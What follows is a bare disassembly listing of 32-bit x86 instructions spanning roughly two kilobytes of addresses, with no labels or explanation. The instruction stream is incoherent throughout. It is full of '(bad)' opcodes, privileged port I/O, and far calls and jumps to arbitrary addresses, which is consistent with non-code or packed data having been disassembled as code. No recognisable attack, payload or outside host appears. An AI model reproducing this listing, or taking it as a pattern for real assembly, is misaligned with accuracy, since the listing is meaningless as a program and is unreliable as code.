  40eb87:	push   0xfc597f56
  40eb8c:	icebp  
  40eb8d:	mov    eax,ds:0x2627222
  40eb92:	int    0xbb
  40eb94:	popf   
  40eb95:	rcr    DWORD PTR [edi-0x40],cl
  40eb98:	rcl    BYTE PTR [ebp+0x76],cl
  40eb9b:	jmp    0xc300a66a
  40eba0:	es push ebx
  40eba2:	shr    bh,cl
  40eba4:	dec    ebx
  40eba5:	sbb    bh,BYTE PTR [edi]
  40eba7:	popf   
  40eba8:	push   ecx
  40eba9:	pop    ss
  40ebaa:	lea    edi,[eax]
  40ebac:	repnz sub DWORD PTR [ecx+0x189c8c9c],ebx
  40ebb3:	rcl    BYTE PTR [esi],1
  40ebb5:	and    ebp,esp
  40ebb7:	mov    ebx,0xded2755f
  40ebbc:	sbb    al,0x48
  40ebbe:	lds    ecx,FWORD PTR es:0xb6cb18d1
  40ebc5:	leave  
  40ebc6:	inc    ebp
  40ebc7:	push   edx
  40ebc8:	adc    ebp,DWORD PTR [edx]
  40ebca:	mov    ch,0xcc
  40ebcc:	mov    ah,0x4
  40ebce:	mov    ch,0xea
  40ebd0:	and    edx,DWORD PTR [edx-0x64]
  40ebd3:	push   esi
  40ebd4:	cli    
  40ebd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebd6:	mov    WORD PTR [ecx-0x46133e73],?
  40ebdc:	sub    DWORD PTR [ecx],ecx
  40ebde:	mov    ds:0x7bc2ec28,al
  40ebe3:	xchg   esp,eax
  40ebe4:	add    DWORD PTR [ebx+ecx*1-0x53],0xddc41abe
  40ebec:	xor    ecx,DWORD PTR [esi-0x23]
  40ebef:	call   0x539da36c
  40ebf4:	lods   eax,DWORD PTR ds:[esi]
  40ebf5:	xor    eax,0x40c173a7
  40ebfa:	cmp    ebx,edx
  40ebfc:	cmc    
  40ebfd:	jmp    0x804c8554
  40ec02:	gs cmp al,dl
  40ec05:	or     dl,BYTE PTR [esi-0x23]
  40ec08:	pop    edx
  40ec09:	xchg   DWORD PTR [eax],edi
  40ec0b:	not    ebp
  40ec0d:	aaa    
  40ec0e:	dec    esi
  40ec0f:	pusha  
  40ec10:	(bad)  
  40ec11:	fcomp  st(5)
  40ec13:	aaa    
  40ec14:	xor    al,0x81
  40ec16:	push   ds
  40ec17:	(bad)  
  40ec18:	push   ebp
  40ec19:	sub    al,0xdd
  40ec1b:	push   esi
  40ec1c:	repz mov edx,0x3b73bf6e
  40ec22:	xor    al,0xb1
  40ec24:	and    BYTE PTR [edi-0x2c784ed9],al
  40ec2a:	cmp    dl,BYTE PTR ds:0xeef948e9
  40ec30:	add    DWORD PTR [edx],0x3d
  40ec33:	out    dx,al
  40ec34:	fwait
  40ec35:	test   DWORD PTR [eax],ebx
  40ec37:	in     eax,dx
  40ec38:	and    ebx,DWORD PTR ds:0xac92c333
  40ec3e:	cdq    
  40ec3f:	call   0xa956:0x917d5723
  40ec46:	mov    cl,0x4a
  40ec48:	test   eax,0x24facbdf
  40ec4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec4e:	add    eax,0xe28878e4
  40ec53:	outs   dx,DWORD PTR ds:[esi]
  40ec54:	inc    esi
  40ec55:	mov    WORD PTR [edi+esi*4],ds
  40ec58:	jle    0x40ec0a
  40ec5a:	push   ecx
  40ec5b:	sbb    DWORD PTR [ebx],ecx
  40ec5d:	out    dx,eax
  40ec5e:	xor    bh,BYTE PTR [ebp+0x5b]
  40ec61:	push   DWORD PTR [esi-0x48]
  40ec64:	mov    al,0xb2
  40ec66:	or     ch,BYTE PTR [ebx+0x660aecda]
  40ec6c:	aad    0xe6
  40ec6e:	mov    al,ds:0x2aa3d31f
  40ec73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec74:	pop    es
  40ec75:	loop   0x40eca9
  40ec77:	inc    ebp
  40ec78:	retf   0xef8c
  40ec7b:	call   0x56eed03a
  40ec80:	sub    DWORD PTR [ecx],esp
  40ec82:	test   DWORD PTR [ebx-0x631f3e3],edi
  40ec88:	ins    DWORD PTR es:[edi],dx
  40ec89:	mov    edi,0xc3f9af19
  40ec8e:	stos   BYTE PTR es:[edi],al
  40ec8f:	mov    ebp,0xb02935bd
  40ec94:	pop    esp
  40ec95:	or     BYTE PTR [ecx+0x57],ch
  40ec98:	(bad)  
  40ec99:	fisttp DWORD PTR [eax+0x83332f8]
  40ec9f:	ret    
  40eca0:	add    al,0xe
  40eca2:	mov    eax,0x45f3ff70
  40eca7:	fcmovb st,st(0)
  40eca9:	pop    DWORD PTR [eax-0x310d67b4]
  40ecaf:	icebp  
  40ecb0:	pop    eax
  40ecb1:	nop
  40ecb2:	lds    esi,FWORD PTR [ebx+0x6c]
  40ecb5:	fbld   TBYTE PTR [edx-0x4f]
  40ecb8:	push   edx
  40ecb9:	(bad)  
  40ecba:	scas   al,BYTE PTR es:[edi]
  40ecbb:	push   es
  40ecbc:	and    ch,BYTE PTR [ebp-0x29]
  40ecbf:	xchg   ebx,eax
  40ecc0:	fs loopne 0x40ec64
  40ecc3:	mov    esi,0xe2a63074
  40ecc8:	jp     0x40ecde
  40ecca:	xchg   edx,eax
  40eccb:	push   edx
  40eccc:	vdivps xmm0,xmm1,xmm3
  40ecd0:	or     dh,BYTE PTR [edi+0x5f]
  40ecd3:	inc    DWORD PTR [edi+0x1974b393]
  40ecd9:	adc    BYTE PTR [edi+0x48],ah
  40ecdc:	push   eax
  40ecdd:	pop    ecx
  40ecde:	sbb    DWORD PTR [edx-0x32],edx
  40ece1:	fs fcmovbe st,st(4)
  40ece4:	pop    ebx
  40ece5:	iret   
  40ece6:	imul   esp,DWORD PTR [ecx],0xc10d3b6e
  40ecec:	jo     0x40ed36
  40ecee:	call   0x22776406
  40ecf3:	nop
  40ecf4:	dec    esp
  40ecf5:	(bad)  
  40ecf6:	mov    al,0x3a
  40ecf8:	or     cl,ah
  40ecfa:	xchg   edx,eax
  40ecfb:	dec    ebp
  40ecfc:	enter  0x2bf9,0xbb
  40ed00:	push   0x63fb0103
  40ed05:	ss pop ecx
  40ed07:	xchg   edi,eax
  40ed08:	out    dx,eax
  40ed09:	out    dx,eax
  40ed0a:	add    BYTE PTR [eax+0xd],dl
  40ed0d:	fs stos BYTE PTR es:[edi],al
  40ed0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed10:	dec    edi
  40ed11:	xchg   edi,eax
  40ed12:	sbb    edx,edx
  40ed14:	inc    edi
  40ed15:	pusha  
  40ed16:	ins    DWORD PTR es:[edi],dx
  40ed17:	aad    0x6a
  40ed19:	in     eax,0x84
  40ed1b:	nop
  40ed1c:	lea    edi,[ebx]
  40ed1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed1f:	jo     0x40ed3d
  40ed21:	cwde   
  40ed22:	jne    0x40ed70
  40ed24:	(bad)  
  40ed25:	enter  0xa6cc,0xd9
  40ed29:	mov    WORD PTR [eax+ebx*1+0x16],fs
  40ed2d:	in     al,dx
  40ed2e:	adc    BYTE PTR [ebx-0x30],ah
  40ed31:	or     al,0xe5
  40ed33:	std    
  40ed34:	push   ds
  40ed35:	cmc    
  40ed36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed37:	out    dx,eax
  40ed38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed39:	mov    esi,0x85e2fced
  40ed3e:	cmp    eax,0x6b136b04
  40ed43:	lahf   
  40ed44:	adc    eax,ecx
  40ed46:	adc    bl,BYTE PTR [esi+0x0]
  40ed49:	sti    
  40ed4a:	inc    edx
  40ed4b:	pop    ebp
  40ed4c:	mov    ds,ebx
  40ed4e:	xchg   DWORD PTR [edi-0x2321e937],ebx
  40ed54:	xchg   BYTE PTR [ebp+0x10a10b12],dh
  40ed5a:	mov    ecx,0x418ed3e
  40ed5f:	lahf   
  40ed60:	(bad)
  40ed64:	enter  0xffd8,0xaf
  40ed68:	mov    esi,0xfc95c0a
  40ed6d:	(bad)  
  40ed6e:	dec    ecx
  40ed6f:	pop    ss
  40ed70:	adc    al,0xf6
  40ed72:	and    eax,0xeda3753d
  40ed77:	ficomp WORD PTR [edi+edx*2+0x40]
  40ed7b:	fs add eax,0xfe07ff1
  40ed81:	into   
  40ed82:	scas   ax,WORD PTR es:[edi]
  40ed84:	jge    0x40ed5f
  40ed86:	mov    bh,0xd8
  40ed88:	xor    al,dh
  40ed8a:	xor    eax,0x74f50230
  40ed8f:	stc    
  40ed90:	stos   DWORD PTR es:[edi],eax
  40ed91:	pop    ebp
  40ed92:	mov    dh,ah
  40ed94:	inc    esi
  40ed95:	mov    esp,0x769106d6
  40ed9a:	call   0xccbc:0x3684ba58
  40eda1:	stos   DWORD PTR es:[edi],eax
  40eda2:	loope  0x40eddc
  40eda4:	cli    
  40eda5:	xor    eax,0xa32edc9c
  40edaa:	pusha  
  40edab:	iret   
  40edac:	(bad)  
  40edad:	mov    ah,0xa7
  40edaf:	mov    bh,0xa2
  40edb1:	pop    esi
  40edb2:	and    BYTE PTR [ecx+0x35],al
  40edb5:	sbb    BYTE PTR [edx],dh
  40edb7:	adc    DWORD PTR [esi],ebp
  40edb9:	inc    ebx
  40edba:	dec    ebx
  40edbb:	lahf   
  40edbc:	cmp    bh,al
  40edbe:	sahf   
  40edbf:	push   ebx
  40edc0:	repnz icebp 
  40edc2:	stos   BYTE PTR es:[edi],al
  40edc3:	jnp    0x40ee02
  40edc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc6:	pop    ebp
  40edc7:	les    ebp,FWORD PTR [ebp+esi*2-0x52]
  40edcb:	cmp    BYTE PTR [bx+di+0x79],al
  40edcf:	daa    
  40edd0:	test   eax,0x1a5b5070
  40edd5:	cmp    eax,0xad13e14f
  40edda:	xor    DWORD PTR [edx],ecx
  40eddc:	fwait
  40eddd:	cmp    bh,bh
  40eddf:	push   edx
  40ede0:	sub    al,0xe0
  40ede2:	leave  
  40ede3:	data16 mov gs,WORD PTR [eax-0x7c4ba441]
  40edea:	(bad)  
  40edeb:	into   
  40edec:	pusha  
  40eded:	pop    eax
  40edee:	push   ebx
  40edef:	cs shl BYTE PTR ds:[eax+0x9],cl
  40edf4:	jbe    0x40ee03
  40edf6:	xor    esp,DWORD PTR [eax+0x3a]
  40edf9:	bnd jns 0x40ee48
  40edfc:	jns    0x40ee58
  40edfe:	or     ecx,DWORD PTR [edi-0x653e20e9]
  40ee04:	shl    DWORD PTR [edi+0x44ede877],0xed
  40ee0b:	popf   
  40ee0c:	and    BYTE PTR [eax],ch
  40ee0e:	mov    al,ds:0x6ee334d3
  40ee13:	mov    cl,0x37
  40ee15:	push   ebx
  40ee16:	inc    esi
  40ee17:	fs jbe 0x40ee75
  40ee1a:	push   0x30
  40ee1c:	test   al,0x30
  40ee1e:	cmc    
  40ee1f:	lea    eax,[edx-0x77]
  40ee22:	mov    ds:0x934663f5,al
  40ee27:	aaa    
  40ee28:	add    BYTE PTR [eax+ecx*4+0x77],dh
  40ee2c:	xor    al,0x5d
  40ee2e:	mov    dl,0x97
  40ee30:	push   edi
  40ee31:	jmp    0xde3:0x1a8ec7e8
  40ee38:	arpl   sp,ax
  40ee3a:	jl     0x40ee2c
  40ee3c:	cmp    BYTE PTR [ebx-0x5a7c7965],0xc
  40ee43:	test   BYTE PTR [edi+ecx*2],bl
  40ee46:	and    DWORD PTR ds:0xdb1ac990,esi
  40ee4c:	xchg   BYTE PTR [edi],dh
  40ee4e:	mov    cl,0xa3
  40ee50:	call   0x2b4dace
  40ee55:	push   0x74
  40ee57:	sub    esi,DWORD PTR [edi+edi*8]
  40ee5a:	dec    ebx
  40ee5b:	xchg   edx,eax
  40ee5c:	stos   BYTE PTR es:[edi],al
  40ee5d:	xchg   esp,eax
  40ee5e:	xor    dl,BYTE PTR [ebx-0x78]
  40ee61:	dec    edx
  40ee62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee63:	cli    
  40ee64:	xchg   ebp,ebp
  40ee66:	sar    BYTE PTR [eax+0x366339a8],cl
  40ee6c:	sub    ecx,DWORD PTR [esi-0x456fec6f]
  40ee72:	cs out 0x28,eax
  40ee75:	push   ss
  40ee76:	mov    dl,0xd8
  40ee78:	aam    0x27
  40ee7a:	dec    edi
  40ee7b:	mov    ds:0xf30f373b,eax
  40ee80:	mov    ecx,0xcb1d391b
  40ee85:	pushf  
  40ee86:	and    ecx,edi
  40ee88:	push   esi
  40ee89:	jns    0x40eeee
  40ee8b:	shr    DWORD PTR [edx+0x29],1
  40ee8e:	(bad)  
  40ee8f:	cmp    eax,0xb98e530c
  40ee94:	retf   
  40ee95:	push   0x5
  40ee97:	jo     0x40ee9a
  40ee99:	and    bh,dl
  40ee9b:	stos   DWORD PTR es:[edi],eax
  40ee9c:	ins    BYTE PTR es:[edi],dx
  40ee9d:	dec    ebx
  40ee9e:	pop    edx
  40ee9f:	or     eax,0x6f670640
  40eea4:	mov    gs,WORD PTR [edx-0x5e]
  40eea7:	xor    cl,BYTE PTR [ebp-0x1f]
  40eeaa:	and    DWORD PTR [ebp+0x465802aa],edi
  40eeb0:	mov    bl,0x75
  40eeb2:	dec    ebx
  40eeb3:	sub    BYTE PTR [edi+0x209514a3],dl
  40eeb9:	cmp    eax,eax
  40eebb:	xchg   DWORD PTR [ebp-0x37990aae],ebx
  40eec1:	pop    eax
  40eec2:	out    0x5b,al
  40eec4:	pop    ss
  40eec5:	and    ah,BYTE PTR [edi-0x42820315]
  40eecb:	loop   0x40ef01
  40eecd:	es mov bh,0x3c
  40eed0:	into   
  40eed1:	push   esp
  40eed2:	ror    ebp,1
  40eed4:	jp     0x40ef45
  40eed6:	push   0x6
  40eed8:	sub    ah,BYTE PTR [esi-0x38]
  40eedb:	xchg   esp,eax
  40eedc:	mov    esi,edx
  40eede:	dec    DWORD PTR [ebp-0x77353ead]
  40eee4:	sub    DWORD PTR [edi],edx
  40eee6:	sar    DWORD PTR [edx+0x6467f568],0xcd
  40eeed:	bound  esp,QWORD PTR ds:0x5341a1d5
  40eef3:	adc    bl,BYTE PTR [edx-0x244fae3f]
  40eef9:	in     eax,0x86
  40eefb:	stos   DWORD PTR es:[edi],eax
  40eefc:	push   esi
  40eefd:	xor    BYTE PTR [edx-0x3212bd0],0x7
  40ef04:	xor    al,0xa
  40ef06:	js     0x40ef4d
  40ef08:	mov    dh,0xfe
  40ef0a:	rcr    BYTE PTR [edi+0x4fd01466],1
  40ef10:	sahf   
  40ef11:	push   edi
  40ef12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef13:	shr    BYTE PTR [ebx],0x72
  40ef16:	and    eax,0x317c3eb4
  40ef1b:	adc    al,0x15
  40ef1d:	ss aaa 
  40ef1f:	addr16 repnz mov ah,0xce
  40ef23:	mov    al,ds:0xb851250e
  40ef28:	in     eax,dx
  40ef29:	inc    edx
  40ef2a:	xor    esi,0x16
  40ef2d:	xchg   esp,eax
  40ef2e:	mov    dh,0x28
  40ef30:	popf   
  40ef31:	xchg   ecx,eax
  40ef32:	mov    ds,WORD PTR [edx-0x4f]
  40ef35:	and    al,0x7b
  40ef37:	dec    esi
  40ef38:	or     edx,esi
  40ef3a:	aam    0xdb
  40ef3c:	fcmovnb st,st(5)
  40ef3e:	dec    esp
  40ef3f:	inc    edx
  40ef40:	xchg   edi,eax
  40ef41:	imul   DWORD PTR [ecx+eiz*2-0x407deab5]
  40ef48:	push   edi
  40ef49:	out    dx,al
  40ef4a:	or     ebx,DWORD PTR [eax-0x6e]
  40ef4d:	fs js  0x40ef8d
  40ef50:	and    DWORD PTR [esp+eiz*8],edi
  40ef53:	out    0x2c,eax
  40ef55:	push   eax
  40ef56:	icebp  
  40ef57:	and    BYTE PTR [edi-0x775458f4],al
  40ef5d:	arpl   di,bx
  40ef5f:	daa    
  40ef60:	leave  
  40ef61:	stos   BYTE PTR es:[edi],al
  40ef62:	and    al,0xd3
  40ef64:	push   ebx
  40ef65:	popf   
  40ef66:	inc    ebx
  40ef67:	outs   dx,BYTE PTR ds:[esi]
  40ef68:	mov    dh,0xcc
  40ef6a:	xor    edi,ecx
  40ef6c:	ret    
  40ef6d:	xor    al,0x2c
  40ef6f:	iret   
  40ef70:	sbb    DWORD PTR cs:[esi+0x9],ecx
  40ef74:	mov    esp,0xd33bfa5b
  40ef79:	adc    ch,BYTE PTR [eax+ecx*4+0x50cc7224]
  40ef80:	and    dl,al
  40ef82:	adc    ebp,DWORD PTR [esi+0xc]
  40ef85:	(bad)  
  40ef86:	out    0x1b,al
  40ef88:	imul   esi,DWORD PTR [esi],0xd14b354
  40ef8e:	neg    DWORD PTR [edi+eax*2]
  40ef91:	sub    al,0xd0
  40ef93:	mov    esp,DWORD PTR [esi-0x4418b91e]
  40ef99:	jl     0x40efcb
  40ef9b:	pusha  
  40ef9c:	cwde   
  40ef9d:	jnp    0x40efa1
  40ef9f:	adc    al,0x25
  40efa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efa2:	xchg   edx,eax
  40efa3:	mov    esi,0x6d173702
  40efa8:	dec    ebx
  40efa9:	mov    ebx,0x41633cf4
  40efae:	ja     0x40ef7a
  40efb0:	dec    esi
  40efb1:	fcmovne st,st(4)
  40efb3:	xlat   BYTE PTR ds:[ebx]
  40efb4:	pop    esp
  40efb5:	out    0x64,eax
  40efb7:	xchg   BYTE PTR [ecx],dl
  40efb9:	lahf   
  40efba:	ss cmp eax,0x4814cb58
  40efc0:	mov    edx,0xaa89b57
  40efc5:	fwait
  40efc6:	adc    BYTE PTR [ebx],bh
  40efc8:	into   
  40efc9:	xor    edi,DWORD PTR [ebp+esi*1+0x56ca3954]
  40efd0:	cld    
  40efd1:	popa   
  40efd2:	xchg   ecx,eax
  40efd3:	loope  0x40ef9f
  40efd5:	or     dh,BYTE PTR [esi-0x9f20da4]
  40efdb:	pop    ebx
  40efdc:	xchg   edx,eax
  40efdd:	jb     0x40f035
  40efdf:	pop    ebx
  40efe0:	xchg   esp,eax
  40efe1:	pop    esi
  40efe2:	cwde   
  40efe3:	mov    ecx,0x7b8b3d0c
  40efe8:	shl    BYTE PTR [eax-0x11ef91a],1
  40efee:	imul   edi,DWORD PTR [eax-0x32c3f600],0xc13274df
  40eff8:	dec    esi
  40eff9:	sub    DWORD PTR [edi+0x19],ecx
  40effc:	(bad)  
  40effd:	jmp    0x40efbd
  40efff:	pop    es
  40f000:	test   eax,0x761c3c4c
  40f005:	and    DWORD PTR [esi],edx
  40f007:	add    eax,0x19b66263
  40f00c:	xchg   esi,eax
  40f00d:	xchg   DWORD PTR [ecx+0x4d08acac],edx
  40f013:	sub    eax,0xe4b97d3
  40f018:	jne    0x40efc7
  40f01a:	in     al,0x9e
  40f01c:	ret    
  40f01d:	cmp    eax,0xf6401be2
  40f022:	push   esp
  40f023:	pop    esi
  40f024:	xchg   esi,eax
  40f025:	push   0xba44c76
  40f02a:	adc    al,0xab
  40f02c:	in     al,0xb3
  40f02e:	xchg   ebx,eax
  40f02f:	dec    ecx
  40f030:	push   0x3a788237
  40f035:	adc    ecx,DWORD PTR [ebp+0x52]
  40f038:	pop    ebp
  40f039:	add    edi,esi
  40f03b:	enter  0x4d97,0xc4
  40f03f:	pop    esi
  40f040:	cmp    eax,0xeee656fe
  40f045:	xlat   BYTE PTR ds:[ebx]
  40f046:	fbstp  TBYTE PTR [ebp-0x6c306abe]
  40f04c:	icebp  
  40f04d:	mov    al,0x78
  40f04f:	xchg   ebp,eax
  40f050:	bound  esi,QWORD PTR [ebp-0x2dfb3673]
  40f056:	jae    0x40f04b
  40f058:	push   esp
  40f059:	out    dx,eax
  40f05a:	and    DWORD PTR [ebp-0x30],edi
  40f05d:	cs xchg edi,eax
  40f05f:	out    0xc,al
  40f061:	pop    ebp
  40f062:	icebp  
  40f063:	jb     0x40f026
  40f065:	nop
  40f066:	jno    0x40f050
  40f068:	or     al,0x5f
  40f06a:	and    cl,cl
  40f06c:	sub    al,0x44
  40f06e:	xor    DWORD PTR [edx+0x4b],esi
  40f071:	stc    
  40f072:	mov    ds:0xab5b23f1,eax
  40f077:	pop    ecx
  40f078:	adc    BYTE PTR [edx+0x28158bd7],bh
  40f07e:	push   ecx
  40f07f:	aaa    
  40f080:	adc    DWORD PTR [ebx+eax*2],edi
  40f083:	repz jbe 0x40f04a
  40f086:	hlt    
  40f087:	xchg   ebp,eax
  40f088:	jmp    0xecd651b
  40f08d:	and    eax,0x74456ac5
  40f092:	dec    esp
  40f093:	cld    
  40f094:	mov    ah,0x42
  40f096:	fcom   DWORD PTR [ebx+0x44]
  40f099:	sbb    al,0x75
  40f09b:	xchg   esp,eax
  40f09c:	push   eax
  40f09d:	add    eax,0x5c9ee768
  40f0a2:	ret    
  40f0a3:	sbb    al,0x0
  40f0a5:	cli    
  40f0a6:	add    dh,BYTE PTR ds:0x7f06b5b2
  40f0ac:	push   es
  40f0ad:	std    
  40f0ae:	mov    ecx,edx
  40f0b0:	fs inc eax
  40f0b2:	scas   eax,DWORD PTR es:[edi]
  40f0b3:	inc    ecx
  40f0b4:	adc    eax,0x4f97c27b
  40f0b9:	pop    ecx
  40f0bb:	fsub   QWORD PTR [edx+ebx*1+0x3f]
  40f0bf:	xchg   ecx,eax
  40f0c0:	in     eax,0x7f
  40f0c2:	mov    ds:0x946bc2d0,al
  40f0c7:	adc    BYTE PTR [esi],0x98
  40f0ca:	ds fs push ecx
  40f0cd:	scas   al,BYTE PTR es:[edi]
  40f0ce:	ss inc esi
  40f0d0:	mov    al,bl
  40f0d2:	out    dx,al
  40f0d3:	das    
  40f0d4:	adc    DWORD PTR [eax],eax
  40f0d6:	mov    edx,0x38118312
  40f0db:	iret   
  40f0dc:	or     al,0x4d
  40f0de:	clc    
  40f0df:	add    ebp,DWORD PTR [edx]
  40f0e1:	mov    ecx,0xda5bd79f
  40f0e6:	xchg   esp,eax
  40f0e7:	add    eax,0x1fc456b
  40f0ec:	sbb    BYTE PTR [ebx-0x3],bl
  40f0ef:	or     DWORD PTR [ebx],0x1d
  40f0f2:	outs   dx,DWORD PTR ds:[esi]
  40f0f3:	or     ebp,DWORD PTR [eax+edi*2+0x10]
  40f0f7:	lahf   
  40f0f8:	lock sub BYTE PTR [eax+0x47850a15],al
  40f0ff:	mov    gs,eax
  40f101:	pushf  
  40f102:	inc    ebx
  40f103:	mov    eax,0x4b3618bc
  40f108:	cmp    eax,0x89de5969
  40f10d:	adc    eax,0x5b016a2f
  40f112:	int3   
  40f113:	inc    ebp
  40f114:	xlat   BYTE PTR ds:[ebx]
  40f115:	ror    BYTE PTR ds:0x1c1c52f4,cl
  40f11b:	mov    cs,WORD PTR [ebx]
  40f11d:	test   dl,ah
  40f11f:	sbb    al,0x7c
  40f121:	test   DWORD PTR [ecx+ebp*4+0x2658020a],eax
  40f128:	pop    ebp
  40f129:	test   al,0xf0
  40f12b:	enter  0x587e,0xfe
  40f12f:	fsubr  st(5),st
  40f131:	pop    es
  40f132:	mov    al,0x45
  40f134:	add    al,0xaa
  40f136:	arpl   WORD PTR [ebx+0x2],dx
  40f139:	cmp    ebp,DWORD PTR [ecx+0x49]
  40f13c:	das    
  40f13d:	out    0x9,al
  40f13f:	clc    
  40f140:	call   0x34d8:0x7188f5d7
  40f147:	ins    DWORD PTR es:[edi],dx
  40f148:	xor    eax,0x2ac36a11
  40f14d:	dec    ebx
  40f14e:	jno    0x40f1bf
  40f150:	pop    esp
  40f151:	in     eax,0xdb
  40f153:	cmp    eax,0xdc5db23e
  40f158:	add    eax,0xda85820e
  40f15d:	out    dx,eax
  40f15e:	retf   0xb800
  40f161:	pop    ds
  40f162:	sbb    al,0x24
  40f164:	or     ebp,esp
  40f166:	cmp    BYTE PTR [ecx+0x56],dh
  40f169:	(bad)  
  40f16b:	sbb    ebx,DWORD PTR [edi-0x3]
  40f16e:	sbb    BYTE PTR [ecx],0xdd
  40f171:	mov    cl,0x6
  40f173:	sub    DWORD PTR ds:0xf1677840,esp
  40f179:	or     esi,DWORD PTR [ebp+0x87b663f]
  40f17f:	dec    ebx
  40f180:	dec    edx
  40f181:	pushf  
  40f182:	fidiv  WORD PTR [esi+edx*8-0x73a07a51]
  40f189:	xchg   ecx,eax
  40f18a:	gs push es
  40f18c:	fld    st(4)
  40f18e:	inc    edi
  40f18f:	mov    edi,esi
  40f191:	loope  0x40f20e
  40f193:	sbb    eax,DWORD PTR [esi+ebp*8-0x3cea1020]
  40f19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f19b:	imul   ecx,ebx,0x6c
  40f19e:	fbld   TBYTE PTR [edx-0x1ae4af4a]
  40f1a4:	pushf  
  40f1a5:	adc    eax,0x1c0543c8
  40f1aa:	ins    BYTE PTR es:[edi],dx
  40f1ab:	dec    ecx
  40f1ac:	add    eax,DWORD PTR [ebp-0xf]
  40f1af:	mov    eax,ds:0x5c81b089
  40f1b4:	xchg   ebp,eax
  40f1b5:	call   0xa79e228f
  40f1ba:	sub    DWORD PTR [esi-0x3d6e13f6],ebp
  40f1c0:	leave  
  40f1c1:	xchg   ebx,eax
  40f1c2:	add    DWORD PTR [esi-0x48d5dfa0],ebp
  40f1c8:	pop    es
  40f1c9:	push   ss
  40f1ca:	pop    es
  40f1cb:	pushf  
  40f1cc:	mov    ds:0x2b21aaf7,eax
  40f1d1:	mov    DWORD PTR [esi],edx
  40f1d3:	outs   dx,DWORD PTR ds:[esi]
  40f1d4:	inc    BYTE PTR [ecx-0x4a89ac46]
  40f1da:	xchg   edi,eax
  40f1db:	(bad)  
  40f1dc:	out    dx,eax
  40f1dd:	pop    esi
  40f1de:	imul   ebx,DWORD PTR [edi-0x3d],0x13a60a43
  40f1e5:	mov    ds:0x551e6697,al
  40f1ea:	sbb    eax,0xaa44a766
  40f1ef:	pop    ecx
  40f1f0:	jp     0x40f1d0
  40f1f2:	repz lea eax,[ecx-0x71]
  40f1f6:	sahf   
  40f1f7:	in     al,dx
  40f1f8:	dec    eax
  40f1f9:	inc    eax
  40f1fa:	repnz adc ebx,0x261e76d7
  40f201:	add    DWORD PTR [edi-0xc],0x5c
  40f205:	jne    0x40f21d
  40f207:	mov    edi,0x91723894
  40f20c:	inc    ecx
  40f20d:	in     eax,dx
  40f20e:	mov    eax,ds:0x46ca5db4
  40f213:	push   es
  40f214:	aas    
  40f215:	rcl    DWORD PTR [eax-0x3dbb16fc],0xf
  40f21c:	add    eax,edx
  40f21e:	jbe    0x40f1f7
  40f220:	lods   al,BYTE PTR ds:[esi]
  40f221:	sti    
  40f222:	arpl   WORD PTR [edx],dx
  40f224:	sub    eax,0x97620372
  40f229:	rcl    DWORD PTR [ebx-0x24],cl
  40f22c:	shl    BYTE PTR [edi+0x7a],0xb0
  40f230:	pushf  
  40f231:	bound  esp,QWORD PTR [edi+0x3d]
  40f234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f235:	xchg   BYTE PTR [edx],cl
  40f237:	add    al,0x4e
  40f239:	fcomp  QWORD PTR [ebx-0x1783c0dc]
  40f23f:	shr    BYTE PTR [edx+0x5297a543],cl
  40f245:	fs pop esi
  40f247:	neg    edi
  40f249:	addr16 or al,0xa2
  40f24c:	mov    ds:0xa40ef78e,eax
  40f251:	ret    0xcadc
  40f254:	sub    DWORD PTR [ebx+0x3a5b36bd],ebp
  40f25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f25b:	jmp    0xb841:0x16b83209
  40f262:	mov    bh,0x78
  40f264:	test   DWORD PTR [edx+0xfbb5931],edx
  40f26a:	xor    dh,BYTE PTR ss:[ecx]
  40f26d:	repnz int 0x55
  40f270:	fwait
  40f271:	add    ax,0xd04e
  40f275:	jbe    0x40f2e5
  40f277:	or     ebx,DWORD PTR [edi-0x2a]
  40f27a:	dec    eax
  40f27b:	push   0x5982eb8b
  40f280:	push   0x12f5dd00
  40f285:	pop    ds
  40f286:	in     al,dx
  40f287:	lds    edx,FWORD PTR [ecx-0x43]
  40f28a:	sti    
  40f28b:	or     eax,eax
  40f28d:	call   0xd84b6d76
  40f292:	not    DWORD PTR [edi-0x4b]
  40f295:	mov    WORD PTR [ebp+edx*2-0x1f],es
  40f299:	fmul   DWORD PTR [ecx]
  40f29b:	pop    es
  40f29c:	(bad)  
  40f29e:	mov    eax,0xe1c875c6
  40f2a3:	add    al,0x55
  40f2a5:	outs   dx,BYTE PTR ds:[esi]
  40f2a6:	jmp    0x40f274
  40f2a8:	out    0xb,eax
  40f2aa:	jge    0x40f291
  40f2ac:	in     eax,0x2e
  40f2ae:	sbb    BYTE PTR [ebp+0x18],cl
  40f2b1:	xor    esp,ecx
  40f2b3:	jae    0x40f2f5
  40f2b5:	pop    ebx
  40f2b6:	jmp    0x40f302
  40f2b8:	push   edi
  40f2b9:	scas   al,BYTE PTR es:[edi]
  40f2ba:	arpl   WORD PTR [edi],bx
  40f2bc:	jp     0x40f2d7
  40f2be:	les    ebp,FWORD PTR gs:[edx+0xea22926]
  40f2c5:	inc    eax
  40f2c6:	push   ds
  40f2c7:	in     eax,dx
  40f2c8:	stc    
  40f2c9:	push   0x0
  40f2cb:	ret    0x8378
  40f2ce:	push   ebp
  40f2cf:	int    0xf
  40f2d1:	mov    ebx,0xd51acf67
  40f2d6:	shr    DWORD PTR [ebx+eiz*4],1
  40f2d9:	addr16 rcr al,0x11
  40f2dd:	(bad)  
  40f2de:	test   DWORD PTR [esi-0x74],0x8c6f9307
  40f2e5:	dec    edi
  40f2e6:	or     al,0x36
  40f2e8:	repnz call 0xe491:0x772cb818
  40f2f0:	leave  
  40f2f1:	pusha  
  40f2f2:	in     eax,dx
  40f2f3:	sti    
  40f2f4:	pop    eax
  40f2f5:	jp     0x40f314
